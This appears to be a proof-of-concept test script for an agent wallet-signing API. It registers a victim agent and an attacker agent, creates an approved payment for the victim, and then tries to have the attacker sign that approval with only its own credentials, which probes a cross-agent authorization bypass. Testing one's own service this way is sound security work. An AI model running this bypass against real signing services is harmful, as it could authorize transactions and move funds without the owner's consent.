import { plain, ADMIN2, signedReq } from "./lib2";
import { cap, intent } from "./lib";

// Two agents, two capabilities. Victim: agent-v. Attacker: agent-x.
const regV = await plain("/agents", "POST", { agentId: "agent-v" }, ADMIN2);
const regX = await plain("/agents", "POST", { agentId: "agent-x" }, ADMIN2);
console.log("register v:", regV.status, JSON.stringify(regV.body).slice(0,150));
const sV = regV.body.secret, sX = regX.body.secret;

const cV = cap({ agentId: "agent-v", recipients: { mode: "ALLOWLIST", allow: ["0x1111111111111111111111111111111111111111"], deny: [] } });
await plain("/capabilities", "POST", cV, ADMIN2);

const i = intent(cV.capabilityId, { to: "0x1111111111111111111111111111111111111111", value: "1000000000000000" }, { amountUsd: 3.2, nonce: 11 });
i.agentId = "agent-v";
const a = await signedReq("agent-v", sV, "POST", "/approvals", i);
console.log("victim approval:", a.status, a.body.status, a.body.approval?.approvalId);

// Attacker agent-x, holding only its OWN credential, signs the victim's approval.
const s = await signedReq("agent-x", sX, "POST", "/sign", { approvalId: a.body.approval.approvalId, transaction: i.transaction });
console.log("attacker /sign:", s.status, s.body.status ?? s.body.code, s.body.signatureType, "reason:", (s.body.reason ?? "").slice(0,120));
console.log("signedTransaction:", String(s.body.signedTransaction).slice(0,50));
